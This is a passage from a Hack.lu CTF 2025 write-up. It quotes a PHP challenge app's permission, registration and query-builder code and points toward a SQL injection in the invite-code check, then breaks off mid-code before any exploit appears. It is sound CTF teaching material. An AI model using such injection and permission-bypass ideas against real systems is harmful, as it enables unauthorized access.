@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang xml:lang>
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>README</title>
+  <style>
+code{white-space: pre-wrap;}
+span.smallcaps{font-variant: small-caps;}
+div.columns{display: flex; gap: min(4vw, 1.5em);}
+div.column{flex: auto; overflow-x: auto;}
+div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+
+ul.task-list[class]{list-style: none;}
+ul.task-list li input[type="checkbox"] {
+font-size: inherit;
+width: 0.8em;
+margin: 0 0.8em 0.2em -1.6em;
+vertical-align: middle;
+}
+.display.math{display: block; text-align: center; margin: 0.5rem auto;}
+
+html { -webkit-text-size-adjust: 100%; }
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+.sourceCode { overflow: visible; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+{ counter-reset: source-line 0; }
+pre.numberSource code > span
+{ position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+{ content: counter(source-line);
+position: relative; left: -1em; text-align: right; vertical-align: baseline;
+border: none; display: inline-block;
+-webkit-touch-callout: none; -webkit-user-select: none;
+-khtml-user-select: none; -moz-user-select: none;
+-ms-user-select: none; user-select: none;
+padding: 0 4px; width: 4em;
+}
+pre.numberSource { margin-left: 3em; padding-left: 4px; }
+div.sourceCode
+{ color: #cccccc; background-color: #303030; }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+code span.al { color: #ffcfaf; } 
+code span.an { color: #7f9f7f; font-weight: bold; } 
+code span.at { } 
+code span.bn { color: #dca3a3; } 
+code span.bu { } 
+code span.cf { color: #f0dfaf; } 
+code span.ch { color: #dca3a3; } 
+code span.cn { color: #dca3a3; font-weight: bold; } 
+code span.co { color: #7f9f7f; } 
+code span.cv { color: #7f9f7f; font-weight: bold; } 
+code span.do { color: #7f9f7f; } 
+code span.dt { color: #dfdfbf; } 
+code span.dv { color: #dcdccc; } 
+code span.er { color: #c3bf9f; } 
+code span.ex { } 
+code span.fl { color: #c0bed1; } 
+code span.fu { color: #efef8f; } 
+code span.im { } 
+code span.in { color: #7f9f7f; font-weight: bold; } 
+code span.kw { color: #f0dfaf; } 
+code span.op { color: #f0efd0; } 
+code span.ot { color: #efef8f; } 
+code span.pp { color: #ffcfaf; font-weight: bold; } 
+code span.sc { color: #dca3a3; } 
+code span.ss { color: #cc9393; } 
+code span.st { color: #cc9393; } 
+code span.va { } 
+code span.vs { color: #cc9393; } 
+code span.wa { color: #7f9f7f; font-weight: bold; } 
+</style>
+  <link rel="stylesheet" href="github-markdown.css" />
+</head>
+<body>
+<p>This is a joint write up between me and my colleague <span class="citation" data-cites="4v1at0r">@4v1at0r</span> for Hacklu CTF
+2025.</p>
+<p>This is a really interesting challenge where amazing teamwork and
+collaboration allowed us to solve it!</p>
+<h2 id="toc">ToC</h2>
+<ul>
+<li><a href="#registering">Registering a user</a></li>
+<li><a href="#the%20problem">The Problem</a></li>
+<li><a href="#now%20what?">Now what?</a></li>
+<li><a href="#settings">Settings</a></li>
+<li><a href="#putting%20everything%20together">Putting everything
+together</a></li>
+<li><a href="#exploit">Exploit</a></li>
+</ul>
+<h2 id="the-code">The code</h2>
+<p>We are given the src code of this app, and without bothering you too
+much I’ll show you here.</p>
+<pre><code>├── src
+│   ├── art
+│   │   ├── BURPSUITVIK.txt
+│   │   ├── FLÄGG.txt
+│   │   ├── KALIFJORD.txt
+│   │   ├── NMAPPAV.txt
+│   │   └── WIREHAJ.txt
+│   ├── flag.php
+│   ├── inc
+│   │   ├── db.php
+│   │   ├── footer.php
+│   │   ├── header.php
+│   │   ├── invites.php
+│   │   ├── perms.php
+│   │   ├── required.php
+│   │   ├── users.php
+│   │   └── utils.php
+│   ├── index.php
+│   ├── install.php
+│   ├── login.php
+│   ├── logout.php
+│   ├── register.php
+│   ├── settings.php
+│   ├── style.css
+│   └── tty.css</code></pre>
+<p>Here is what flag.php looks like:</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="kw">include_once</span> <span class="st">&#39;inc/required.php&#39;</span><span class="ot">;</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="kw">include_once</span> <span class="st">&#39;inc/perms.php&#39;</span><span class="ot">;</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>enforce_auth()<span class="ot">;</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="kw">include_once</span> <span class="st">&#39;inc/header.php&#39;</span><span class="ot">;</span></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> (has_perms(<span class="st">&#39;flag_read&#39;</span>)) {</span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">echo</span> <span class="st">&#39;&lt;h2&gt;Flag&lt;/h2&gt;&#39;</span><span class="ot">;</span></span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>    <span class="kw">echo</span> <span class="st">&#39;&lt;p&gt;Flag: &lt;code&gt;&#39;</span> <span class="op">.</span> <span class="fu">getenv</span>(<span class="st">&#39;FLAG&#39;</span>) <span class="op">.</span> <span class="st">&#39;&lt;/code&gt;&lt;/p&gt;&#39;</span><span class="ot">;</span></span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>} <span class="cf">else</span> {</span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a>    <span class="kw">echo</span> <span class="st">&#39;&lt;h2&gt;Flag&lt;/h2&gt;&#39;</span><span class="ot">;</span></span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a>    <span class="kw">echo</span> <span class="st">&#39;&lt;p&gt;You do not have permission to view the flag.&lt;/p&gt;&#39;</span><span class="ot">;</span></span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a><span class="kw">include_once</span> <span class="st">&#39;inc/footer.php&#39;</span><span class="ot">;</span></span></code></pre></div>
+<p>So its clear we need to have the <code>flag_read</code> permission in
+order to get the flag.</p>
+<p>Let’s analyse the /inc/perms.php file:</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="kw">include_once</span> <span class="st">&#39;db.php&#39;</span><span class="ot">;</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> get_perms() {</span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">global</span> <span class="va">$db</span><span class="ot">;</span></span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>    <span class="va">$res</span> <span class="op">=</span> <span class="va">$db</span>-&gt;select([</span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a>        <span class="st">&#39;SELECT&#39;</span> =&gt; [<span class="st">&#39;perm&#39;</span>]<span class="ot">,</span></span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a>        <span class="st">&#39;FROM&#39;</span> =&gt; <span class="st">&#39;perms&#39;</span><span class="ot">,</span></span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a>        <span class="st">&#39;WHERE&#39;</span> =&gt; [<span class="st">&#39;uid&#39;</span> =&gt; <span class="va">$_SESSION</span>[<span class="st">&#39;uid&#39;</span>] <span class="op">??</span> <span class="op">-</span><span class="dv">1</span>]<span class="ot">,</span></span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a>    ])<span class="ot">;</span></span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a>    <span class="va">$a</span> <span class="op">=</span> <span class="fu">array_map</span>(<span class="kw">function</span>(<span class="va">$perm</span>) { <span class="cf">return</span> <span class="va">$perm</span>[<span class="st">&#39;perm&#39;</span>]<span class="ot">;</span> }<span class="ot">,</span> <span class="va">$res</span>)<span class="ot">;</span></span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">foreach</span> (<span class="va">$a</span> <span class="kw">as</span> <span class="va">$perm</span>) {</span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a>      <span class="fu">error_log</span>(<span class="st">&quot;perms map&quot;</span> <span class="op">.</span> <span class="va">$perm</span>)<span class="ot">;</span></span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="fu">array_map</span>(<span class="kw">function</span>(<span class="va">$perm</span>) { <span class="cf">return</span> <span class="va">$perm</span>[<span class="st">&#39;perm&#39;</span>]<span class="ot">;</span> }<span class="ot">,</span> <span class="va">$res</span>)<span class="ot">;</span></span>
+<span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> has_perms(...<span class="va">$perms</span>) {</span>
+<span id="cb3-20"><a href="#cb3-20" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> (<span class="op">!</span><span class="kw">isset</span>(<span class="va">$_SESSION</span>[<span class="st">&#39;perms&#39;</span>])) {</span>
+<span id="cb3-21"><a href="#cb3-21" aria-hidden="true" tabindex="-1"></a>      <span class="va">$_SESSION</span>[<span class="st">&#39;perms&#39;</span>] <span class="op">=</span> get_perms()<span class="ot">;</span></span>
+<span id="cb3-22"><a href="#cb3-22" aria-hidden="true" tabindex="-1"></a>      <span class="fu">error_log</span>(<span class="st">&quot;PERMS NOT SET, GETTING THEM...&quot;</span>)<span class="ot">;</span></span>
+<span id="cb3-23"><a href="#cb3-23" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb3-24"><a href="#cb3-24" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-25"><a href="#cb3-25" aria-hidden="true" tabindex="-1"></a>    <span class="cf">foreach</span> (<span class="va">$_SESSION</span>[<span class="st">&#39;perms&#39;</span>] <span class="kw">as</span> <span class="va">$lol</span>) {</span>
+<span id="cb3-26"><a href="#cb3-26" aria-hidden="true" tabindex="-1"></a>      <span class="fu">error_log</span>(<span class="st">&quot;ALL PERMS: &quot;</span> <span class="op">.</span> <span class="va">$lol</span>)<span class="ot">;</span></span>
+<span id="cb3-27"><a href="#cb3-27" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb3-28"><a href="#cb3-28" aria-hidden="true" tabindex="-1"></a>    <span class="cf">foreach</span> (<span class="va">$perms</span> <span class="kw">as</span> <span class="va">$perm</span>) {</span>
+<span id="cb3-29"><a href="#cb3-29" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (<span class="op">!</span><span class="fu">in_array</span>(<span class="va">$perm</span><span class="ot">,</span> <span class="va">$_SESSION</span>[<span class="st">&#39;perms&#39;</span>]<span class="ot">,</span> <span class="kw">true</span>)) {</span>
+<span id="cb3-30"><a href="#cb3-30" aria-hidden="true" tabindex="-1"></a>          <span class="fu">error_log</span>(<span class="st">&quot;NOT IN ARRAY: &quot;</span> <span class="op">.</span> <span class="va">$perm</span>)<span class="ot">;</span></span>
+<span id="cb3-31"><a href="#cb3-31" aria-hidden="true" tabindex="-1"></a>          <span class="cf">return</span> <span class="kw">false</span><span class="ot">;</span></span>
+<span id="cb3-32"><a href="#cb3-32" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb3-33"><a href="#cb3-33" aria-hidden="true" tabindex="-1"></a>        <span class="fu">error_log</span>(<span class="st">&quot;You have perms: &quot;</span> <span class="op">.</span> <span class="va">$perm</span>)<span class="ot">;</span></span>
+<span id="cb3-34"><a href="#cb3-34" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb3-35"><a href="#cb3-35" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-36"><a href="#cb3-36" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="kw">true</span><span class="ot">;</span></span>
+<span id="cb3-37"><a href="#cb3-37" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb3-38"><a href="#cb3-38" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-39"><a href="#cb3-39" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> add_perm(<span class="va">$uid</span><span class="ot">,</span> <span class="va">$perm</span>) {</span>
+<span id="cb3-40"><a href="#cb3-40" aria-hidden="true" tabindex="-1"></a>    <span class="kw">global</span> <span class="va">$db</span><span class="ot">;</span></span>
+<span id="cb3-41"><a href="#cb3-41" aria-hidden="true" tabindex="-1"></a>    <span class="va">$db</span>-&gt;insert(<span class="st">&#39;perms&#39;</span><span class="ot">,</span> [</span>
+<span id="cb3-42"><a href="#cb3-42" aria-hidden="true" tabindex="-1"></a>        <span class="st">&#39;uid&#39;</span> =&gt; <span class="va">$uid</span><span class="ot">,</span></span>
+<span id="cb3-43"><a href="#cb3-43" aria-hidden="true" tabindex="-1"></a>        <span class="st">&#39;perm&#39;</span> =&gt; <span class="va">$perm</span><span class="ot">,</span></span>
+<span id="cb3-44"><a href="#cb3-44" aria-hidden="true" tabindex="-1"></a>    ])<span class="ot">;</span></span>
+<span id="cb3-45"><a href="#cb3-45" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb3-46"><a href="#cb3-46" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-47"><a href="#cb3-47" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> add_tmp_perms(...<span class="va">$perms</span>) {</span>
+<span id="cb3-48"><a href="#cb3-48" aria-hidden="true" tabindex="-1"></a>    <span class="va">$_SESSION</span>[<span class="st">&#39;perms&#39;</span>] <span class="op">=</span> <span class="fu">array_merge</span>(<span class="va">$_SESSION</span>[<span class="st">&#39;perms&#39;</span>] <span class="op">??</span> []<span class="ot">,</span> <span class="va">$perms</span>)<span class="ot">;</span></span>
+<span id="cb3-49"><a href="#cb3-49" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb3-50"><a href="#cb3-50" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-51"><a href="#cb3-51" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> rm_tmp_perms(...<span class="va">$perms</span>) {</span>
+<span id="cb3-52"><a href="#cb3-52" aria-hidden="true" tabindex="-1"></a>    <span class="va">$_SESSION</span>[<span class="st">&#39;perms&#39;</span>] <span class="op">=</span> <span class="fu">array_diff</span>(<span class="va">$_SESSION</span>[<span class="st">&#39;perms&#39;</span>] <span class="op">??</span> []<span class="ot">,</span> <span class="va">$perms</span>)<span class="ot">;</span></span>
+<span id="cb3-53"><a href="#cb3-53" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
+<p>The perms are stored on the table <code>perms</code> and the
+<code>uid</code> field is used to identify an user’s perms by
+correlating the user id with the perms id.</p>
+<h2 id="registering">Registering</h2>
+<p>The first thing we had to find out was how to register an
+user.<br><br />
+The registration PHP code code looks like this:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> (<span class="kw">isset</span>(<span class="va">$_REQUEST</span>[<span class="st">&#39;username&#39;</span>]) <span class="op">&amp;&amp;</span> <span class="kw">isset</span>(<span class="va">$_REQUEST</span>[<span class="st">&#39;password&#39;</span>]) <span class="op">&amp;&amp;</span> <span class="kw">isset</span>(<span class="va">$_REQUEST</span>[<span class="st">&#39;code&#39;</span>]) <span class="op">&amp;&amp;</span> <span class="fu">is_string</span>(<span class="va">$_REQUEST</span>[<span class="st">&#39;code&#39;</span>])) {</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> (is_valid_invite(<span class="va">$_POST</span>[<span class="st">&#39;code&#39;</span>])) {</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>        <span class="va">$username</span> <span class="op">=</span> <span class="va">$_POST</span>[<span class="st">&#39;username&#39;</span>]<span class="ot">;</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (get_user_by_name(<span class="va">$username</span>)) {</span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>            show_error(<span class="st">&#39;Username already taken.&#39;</span>)<span class="ot">;</span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>        } <span class="cf">else</span> {</span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>            add_tmp_perms(<span class="st">&#39;users_add&#39;</span>)<span class="ot">;</span></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>            <span class="va">$user</span> <span class="op">=</span> create_user(<span class="va">$username</span><span class="ot">,</span> <span class="va">$_POST</span>[<span class="st">&#39;password&#39;</span>])<span class="ot">;</span></span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>            rm_tmp_perms(<span class="st">&#39;users_add&#39;</span>)<span class="ot">;</span></span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> (<span class="va">$user</span>) {</span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a>                show_success(<span class="st">&#39;Account created successfully.&#39;</span>)<span class="ot">;</span></span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>                <span class="fu">header</span>(<span class="st">&#39;Location: login.php&#39;</span>)<span class="ot">;</span></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>            } <span class="cf">else</span> {</span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a>                show_error(<span class="st">&#39;Failed to create user.&#39;</span>)<span class="ot">;</span></span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a>            }</span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a>    } <span class="cf">else</span> {</span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a>        show_error(<span class="st">&#39;Invalid invite code.&#39;</span>)<span class="ot">;</span></span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb4-20"><a href="#cb4-20" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
+<p>Here we notice the app checks if the variable <code>code</code> is a
+string by caling <code>is_string($_REQUEST[&#39;code&#39;])</code><br><br />
+The app also checks if the given code is valid:
+<code>is_valid_invite($_POST[&#39;code&#39;])</code><br></p>
+<p>Let’s check the <code>is_valid_invite()</code> function:</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> is_valid_invite(<span class="va">$code</span>) {</span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">global</span> <span class="va">$db</span><span class="ot">;</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>    <span class="va">$res</span> <span class="op">=</span> <span class="va">$db</span>-&gt;select([</span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>        <span class="st">&#39;SELECT&#39;</span> =&gt; <span class="st">&#39;*&#39;</span><span class="ot">,</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>        <span class="st">&#39;FROM&#39;</span> =&gt; <span class="st">&#39;invites&#39;</span><span class="ot">,</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>        <span class="st">&#39;WHERE&#39;</span> =&gt; [<span class="st">&#39;code&#39;</span> =&gt; <span class="va">$code</span>]<span class="ot">,</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>    ])<span class="ot">;</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="fu">count</span>(<span class="va">$res</span>) <span class="op">===</span> <span class="dv">1</span><span class="ot">;</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
+<p>It seems to perform the following query:
+<code>SELECT * FROM invites WHERE code = $code</code><br><br />
+Maybe we can find a way to perform a SQL injection attack here?</p>
+<p>Let’s trace it all the way to the custom
+<code>$db-&gt;select()</code> function:</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="kw">function</span> select(<span class="va">$q</span>) {</span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>        <span class="va">$sql</span> <span class="op">=</span> <span class="st">&#39;SELECT &#39;</span><span class="ot">;</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>        <span class="va">$sql</span> <span class="op">.=</span> <span class="va">$q</span>[<span class="st">&#39;SELECT&#39;</span>] <span class="op">===</span> <span class="st">&#39;*&#39;</span> <span class="ot">?</span> <span class="st">&#39;*&#39;</span> <span class="ot">:</span> <span class="fu">implode</span>(<span class="st">&#39;, &#39;</span><span class="ot">,</span> <span class="fu">array_map</span>(<span class="dt">array</span>(<span class="va">$this</span><span class="ot">,</span> <span class="st">&#39;quoteName&#39;</span>)<span class="ot">,</span> <span class="va">$q</span>[<span class="st">&#39;SELECT&#39;</span>]))<span class="ot">;</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (<span class="kw">isset</span>(<span class="va">$q</span>[<span class="st">&#39;FROM&#39;</span>])) <span class="va">$sql</span> <span class="op">.=</span> <span class="st">&#39; FROM &#39;</span> <span class="op">.</span> <span class="va">$this</span>-&gt;quoteName(<span class="va">$q</span>[<span class="st">&#39;FROM&#39;</span>])<span class="ot">;</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (<span class="kw">isset</span>(<span class="va">$q</span>[<span class="st">&#39;WHERE&#39;</span>])) <span class="va">$sql</span> <span class="op">.=</span> <span class="va">$this</span>-&gt;buildWhere(<span class="va">$q</span>[<span class="st">&#39;WHERE&#39;</span>])<span class="ot">;</span></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="va">$this</span>-&gt;query(<span class="va">$sql</span>)-&gt;fetchAll() <span class="op">??</span> []<span class="ot">;</span></span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">private</span> <span class="kw">function</span> buildWhere(<span class="va">$where</span><span class="ot">,</span> <span class="va">$op</span> <span class="op">=</span> <span class="st">&#39;AND&#39;</span>) {</span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a>        <span class="va">$sql</span> <span class="op">=</span> <span class="st">&#39;&#39;</span><span class="ot">;</span></span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a>        <span class="cf">foreach</span> (<span class="va">$where</span> <span class="kw">as</span> <span class="va">$name</span> =&gt; <span class="va">$value</span>) {</span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> (<span class="op">!</span><span class="kw">empty</span>(<span class="va">$sql</span>)) {</span>
+<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a>                <span class="va">$sql</span> <span class="op">.=</span> <span class="st">&quot; </span><span class="va">$op</span><span class="st"> &quot;</span><span class="ot">;</span></span>
+<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a>            }</span>
+<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> ((<span class="va">$name</span> <span class="op">===</span> <span class="st">&#39;OR&#39;</span>) <span class="op">||</span> (<span class="va">$name</span> <span class="op">===</span> <span class="st">&#39;AND&#39;</span>)) {</span>
+<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a>                <span class="va">$sql</span> <span class="op">.=</span> <span class="st">&#39; (&#39;</span> <span class="op">.</span> <span class="va">$this</span>-&gt;buildWhere(<span class="va">$value</span><span class="ot">,</span> <span class="va">$name</span>) <span class="op">.</span> <span class="st">&#39;)&#39;</span><span class="ot">;</span></span>
+<span id="cb6-17"><a href="#cb6-17" aria-hidden="true" tabindex="-1"></a>            } <span class="cf">else</span> <span class="cf">if</span> (<span class="va">$name</span> <span class="op">===</span> <span class="st">&#39;NOT&#39;</span>) {</span>
+<span id="cb6-18"><a href="#cb6-18" aria-hidden="true" tabindex="-1"></a>                <span class="va">$sql</span> <span class="op">.=</span> <span class="st">&#39; NOT (&#39;</span> <span class="op">.</span> <span class="va">$this</span>-&gt;buildWhere(<span class="va">$value</span>) <span class="op">.</span> <span class="st">&#39;)&#39;</span><span class="ot">;</span></span>
+<span id="cb6-19"><a href="#cb6-19" aria-hidden="true" tabindex="-1"></a>            } <span class="cf">else</span> {</span>
+<span id="cb6-20"><a href="#cb6-20" aria-hidden="true" tabindex="-1"></a>                <span class="va">$sql</span> <span class="op">.=</span> <span class="st">&#39; &#39;</span> <span class="op">.</span> <span class="va">$this</span>-&gt;quoteName(<span class="va">$name</span>) <span class="op">.</span> <span class="va">$this</span>-&gt;buildTerm(<span class="va">$value</span>)<span class="ot">;</span></span>
+<span id="cb6-21"><a href="#cb6-21" aria-hidden="true" tabindex="-1"></a>            }</span>
+<span id="cb6-22"><a href="#cb6-22" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb6-23"><a href="#cb6-23" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="st">&#39; WHERE&#39;</span> <span class="op">.</span> <span class="va">$sql</span><span class="ot">;</span></span>
+<span id="cb6-24"><a href="#cb6-24" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb6-25"><a href="#cb6-25" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-26"><a href="#cb6-26" aria-hidden="true" tabindex="-1"></a>    <span class="kw">private</span> <span class="kw">function</span> buildTerm(<span class="va">$term</span>) {</span>
+<span id="cb6-27"><a href="#cb6-27" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (<span class="fu">is_array</span>(<span class="va">$term</span>)) {</span>
+<span id="cb6-28"><a href="#cb6-28" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> (<span class="fu">count</span>(<span class="va">$term</span>) <span class="op">==</span> <span class="dv">2</span> <span class="op">&amp;&amp;</span> <span class="kw">isset</span>(<span class="va">$term</span>[<span class="dv">0</span>]) <span class="op">&amp;&amp;</span> <span class="va">$this</span>-&gt;isOperator(<span class="va">$term</span>[<span class="dv">0</span>])) {</span>
+<span id="cb6-29"><a href="#cb6-29" aria-hidden="true" tabindex="-1"></a>                <span class="va">$comparison</span> <span class="op">=</span> <span class="va">$term</span>[<span class="dv">0</span>]<span class="ot">;</span></span>
+<span id="cb6-30"><a href="#cb6-30" aria-hidden="true" tabindex="-1"></a>                <span class="va">$criterion_value</span> <span class="op">=</span> <span class="va">$term</span>[<span class="dv">1</span>]<span class="ot">;</span></span>
